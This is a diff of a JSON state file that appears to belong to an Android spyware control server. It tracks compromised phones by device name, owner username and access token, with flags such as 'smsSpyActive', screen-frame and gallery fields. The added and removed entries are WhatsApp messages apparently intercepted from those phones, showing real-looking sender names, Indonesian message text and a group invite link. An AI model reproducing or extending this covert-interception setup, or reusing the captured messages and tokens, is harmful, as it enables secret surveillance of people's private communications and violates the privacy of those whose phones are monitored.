@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776782389006,
+    "lastSeen": 1776782407023,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Laa",
+        "content": "Apa",
+        "time": "21/04 21:40",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776782408272
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 21:02",
         "pkg": "com.whatsapp",
         "receivedAt": 1776780179696
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (136 pesan): ~ jall store",
-        "content": "Buka tautan ini untuk bergabung ke grup WhatsApp saya: https://chat.whatsapp.com/FLtl30uj2uuF31bcyT04qU?mode=gi_t \n\n𝗚𝗮𝘀 𝗷𝗼𝗶𝗻 𝗴𝗼 𝘁𝗼 𝟰𝟬𝟬𝗺𝗲𝗺 𝗱𝗮𝗴𝗲𝘁+𝘀𝗲𝘁𝗶𝗮𝗽 𝗝𝗨𝗠'𝗔𝗧",
-        "time": "21/04 21:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780179531
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776782390469,
+    "lastSeen": 1776782408130,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776782388335,
+    "lastSeen": 1776782406301,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
@@ -16704,6 +16704,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "7.4 cowo cowo kaciw",
+        "content": "‎2 pesan baru",
+        "time": "21/04 21:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776782391051
+      },
       {
         "appName": "WhatsApp",
         "sender": "7.4 cowo cowo kaciw",
